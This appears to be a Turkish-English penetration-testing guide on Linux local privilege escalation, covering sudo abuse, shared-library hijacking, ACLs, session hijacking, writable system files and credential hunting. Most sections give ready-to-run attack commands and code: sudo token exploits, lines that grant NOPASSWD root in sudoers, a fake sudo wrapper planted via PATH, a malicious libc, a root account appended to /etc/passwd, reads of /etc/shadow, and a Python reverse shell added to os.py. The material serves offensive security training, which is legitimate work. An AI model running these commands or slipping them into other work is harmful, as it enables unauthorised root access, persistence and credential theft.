[**GTFOBins**](https://gtfobins.github.io) bir saldırganın yerel güvenlik kısıtlamalarını aşmak için sömürebileceği Unix ikili dosyalarının özenle hazırlanmış bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynı şekilde, bir komutta **sadece argüman enjekte edebildiğiniz** durumlar içindir.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya korumak, dosya aktarmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl sömürebileceğini kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolası olmayan durumlarda **sudo access**'iniz varsa, **bir sudo komutunun yürütülmesini bekleyip oturum token'ını ele geçirerek** ayrıcalıkları yükseltebilirsiniz.

Requirements to escalate privileges:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
- "_sampleuser_" son **15 dakika** içinde bir şey çalıştırmak için **`sudo` kullanmış** olmalı (varsayılan olarak bu, parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` ayarını yapabilirsiniz)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) _/tmp_ içinde `activate_sudo_token` adlı ikili dosyayı oluşturacak. Bunu oturumunuzdaki sudo token'ını **aktif hale getirmek** için kullanabilirsiniz (otomatik olarak root shell elde etmeyeceksiniz, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Bu **ikinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **owned by root with setuid** bir sh shell oluşturacak
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **third exploit** (`exploit_v3.sh`) **bir sudoers file oluşturacak**; bu dosya **sudo tokens'ı kalıcı yapar ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulan dosyaların herhangi birinde **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) kullanarak **bir kullanıcı ve PID için sudo token oluşturabilirsiniz**.\  
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'iniz varsa, şu şekilde şifreyi bilmenize gerek kalmadan **sudo ayrıcalıkları elde edebilirsiniz**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **varsayılan olarak yalnızca kullanıcı root ve grup root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgiler **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** gerçekleştirebilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo`'ya alternatif bazı araçlar vardır; yapılandırmasını `/etc/doas.conf`'da kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer **kullanıcı genellikle bir makineye bağlanıp `sudo` kullandığını** ve o kullanıcı bağlamında bir shell elde ettiğinizi biliyorsanız, **yeni bir sudo executable oluşturabilir**; bu executable kodunuzu root olarak çalıştıracak ve ardından kullanıcının komutunu yürütecektir. Sonra, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu .bash_profile içine ekleyerek) değiştirin; böylece kullanıcı sudo çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Not: eğer kullanıcı farklı bir shell (bash değil) kullanıyorsa, yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen konfigürasyon dosyalarının nereden geldiğini** gösterir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki konfigürasyon dosyalarının okunacağı anlamına gelir. Bu konfigürasyon dosyaları **kütüphanelerin aranacağı başka klasörlere işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tür. **Bu, sistemin `/usr/local/lib` içinde kütüphaneler arayacağı anlamına gelir**.

Eğer bir kullanıcı belirtilen yollardan herhangi birinde **yazma iznine** sahipse: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki config dosyasının işaret ettiği herhangi bir klasör, yetki yükseltimi yapabilir.\
Aşağıdaki sayfada **bu yanlış yapılandırmanın nasıl exploit edileceğine** bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalarsanız, program burada `RPATH` değişkeninde belirtildiği gibi onu kullanacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde şu komutla bir kötü amaçlı kütüphane oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities bir sürece **mevcut root ayrıcalıklarının bir alt kümesini** sağlar. Bu, root ayrıcalıklarını **daha küçük ve ayırt edici birimlere** bölmüş olur. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde tüm ayrıcalık seti azaltılır ve istismar riskleri düşer.\
Daha fazla bilgi ve bunların nasıl kötüye kullanılacağı hakkında bilgi edinmek için aşağıdaki sayfayı okuyun:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **bit for "execute"** etkilenen kullanıcının "**cd**" ile klasöre girebileceği anlamına gelir.\
**"read"** biti kullanıcının **files**'ı **listeleyebileceğini**, ve **"write"** biti kullanıcının **delete** ve **create** yeni **files** yapabileceğini ima eder.

## ACLs

Erişim Kontrol Listeleri (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilme** yeteneğine sahiptir. Bu izinler, dosya veya dizin erişimi üzerinde sahip olmayan veya grubun bir parçası olmayan belirli kullanıcılara haklar vererek veya reddederek kontrolü artırır. Bu düzeydeki **ince ayrıntı daha hassas erişim yönetimi sağlar**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Verin** kullanıcı "kali"ya bir dosya üzerinde read ve write izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
Sistemde belirli ACL'lere sahip dosyaları **alın**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in'lerinde gizli ACL backdoor

Yaygın bir yanlış yapılandırma, sahibi root olan ve modu `440` olan `/etc/sudoers.d/` içindeki bir dosyanın ACL aracılığıyla hâlâ düşük ayrıcalıklı bir kullanıcıya yazma izni vermesidir.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Eğer `user:alice:rw-` gibi bir şey görürseniz, kullanıcı kısıtlayıcı mode bitlerine rağmen bir sudo kuralı ekleyebilir:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Bu, yüksek etkili bir ACL persistence/privesc yoludur çünkü sadece `ls -l` incelemelerinde kolayca gözden kaçırılabilir.

## Açık shell oturumları

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** yalnızca **kendi kullanıcı hesabınızın** screen oturumlarına **bağlanabileceksiniz**. Ancak oturumun içinde **ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Bir session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **Valentine box from HTB**'yi inceleyin.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.  
Bu hata, söz konusu OS'lerde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **only 32,768 variations were possible**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şuradan bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Parola ile kimlik doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Public key ile kimlik doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `yes`'tir.
- **PermitEmptyPasswords**: Parola ile kimlik doğrulama izinliyse, sunucunun boş parola dizilerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`'dur.

### Login control files

Bu dosyalar kimlerin nasıl giriş yapabileceğini etkiler:

- **`/etc/nologin`**: mevcutsa, root olmayan girişleri engeller ve mesajını yazdırır.
- **`/etc/securetty`**: root'un nereden giriş yapabileceğini kısıtlar (TTY allowlist).
- **`/etc/motd`**: giriş sonrası banner (environment veya maintenance detaylarını leak edebilir).

### PermitRootLogin

Root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: root yalnızca private key ile ve commands seçenekleri belirtilmişse giriş yapabilir
- `no`: izin verilmez

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bu tokenlar home dizini ile değiştirilecektir. **You can indicate absolute paths** (starting in `/`) veya **relative paths from the user's home** belirtebilirsiniz. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer "**testusername**" kullanıcısının **private** key'iyle giriş yapmayı denerseniz, ssh'nin key'inizin public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını belirtir

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda **use your local SSH keys instead of leaving keys** (without passphrases!) bırakmak zorunda kalmadan bunları kullanmanıza izin verir. Böylece ssh ile önce bir **to a host** **jump** yapabilir, oradan **initial host**'unuzda bulunan **key**'i **using** ederek başka bir **host**'a **jump to another** yapabilirsiniz.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise kullanıcı her farklı makinaya geçtiğinde, o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtarıyla ssh-agent forwarding'e **izin verebilir** veya **engelleyebilir** (varsayılan: izin ver).

Eğer bir ortamda Forward Agent yapılandırıldığını görürseniz aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında **yürütülen betiklerdir**. Bu nedenle, eğer bunların herhangi birini **yazabilir veya değiştirebilirseniz you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir şüpheli profil betiği bulunursa, onu **hassas bilgiler** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor olabilir veya bir yedeği bulunabilir. Bu yüzden **tümünü bulmanız** ve dosyaları **okuyup okuyabildiğinizi kontrol etmeniz**; içlerinde **hashes** olup olmadığını görmek için önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasında **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan password'u ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan bir sahte kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` dosyalarında bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı **hassas dosyalara yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içinde Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Sahipli dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Şifre içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **şifre içerebilecek birkaç olası dosyayı** arar.\
**Bunu yapmak için kullanabileceğiniz başka bir ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac'te yerel bilgisayarda saklanan çok sayıda şifreyi geri almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler bulabilirsiniz**. Log ne kadar garipse o kadar ilginç olur (muhtemelen).\
Ayrıca, bazı "**bad**" yapılandırılmış (backdoored?) **audit logs** size, bu yazıda açıklandığı gibi, **şifreleri audit logları içine kaydetme** imkanı verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Logları okumak** için [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya adında veya içeriğinde "**password**" kelimesi geçen dosyaları kontrol etmelisin; ayrıca loglar içinde IPs ve emails ile hashes regexps'leri de kontrol et.\
Burada bunların nasıl yapılacağını detaylı şekilde listelemeyeceğim ama ilgileniyorsan [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsin.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python script'in **where** çalıştırılacağını biliyor ve o klasöre **can write inside** ya da **modify python libraries** yapabiliyorsan, OS library'yi değiştirip backdoor itebilirsin (python script'in çalıştırılacağı yere yazabiliyorsan, os.py kütüphanesini kopyala ve yapıştır).

Kütüphaneyi **backdoor the library** yapmak için os.py kütüphanesinin sonuna aşağıdaki satırı ekle (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Ağ ile /bin/id arasında boşluk olduğunu unutmayın_)

### **init, init.d, systemd, and rc.d**

`/etc/init.d` dizini, System V init (SysVinit) için **scripts** barındırır; bu, klasik Linux servis yönetim sistemidir. Servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için scriptler içerir. Bunlar doğrudan çalıştırılabilir veya `/etc/rc?.d/` içinde bulunan sembolik linkler aracılığıyla yürütülebilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'ir.

Öte yandan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından getirilen daha yeni bir **service management** olup servis yönetimi görevleri için konfigürasyon dosyaları kullanır. Upstart'e geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit scriptleri hâlâ Upstart konfigürasyonlarının yanında kullanılmaktadır.

**systemd**, modern bir initialization ve servis yöneticisi olarak ortaya çıkar; isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumu snapshot'ları gibi gelişmiş özellikler sunar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` dizinine düzenler, sistem yönetimini kolaylaştırır.

## Diğer Püf Noktaları

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle ayrıcalıklı kernel işlevlerini userspace bir manager'a açmak için bir syscall'e hook uygular. Zayıf manager doğrulaması (ör. FD-order'a dayalı signature kontrolleri veya zayıf password şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten-root'lu cihazlarda root'a yükselmesine olanak tanıyabilir. Daha fazla bilgi ve istismar detayları için bakınız:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations, process komut satırlarından bir binary path çıkarıp bunu ayrıcalıklı bir bağlamda -v ile çalıştırabilir. İzin verici desenler (ör. \S kullanımı) yazılabilir konumlarda (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve root olarak yürütülmeye yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi ve diğer discovery/monitoring yığınlarına uygulanabilecek genel bir desen için bakınız:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
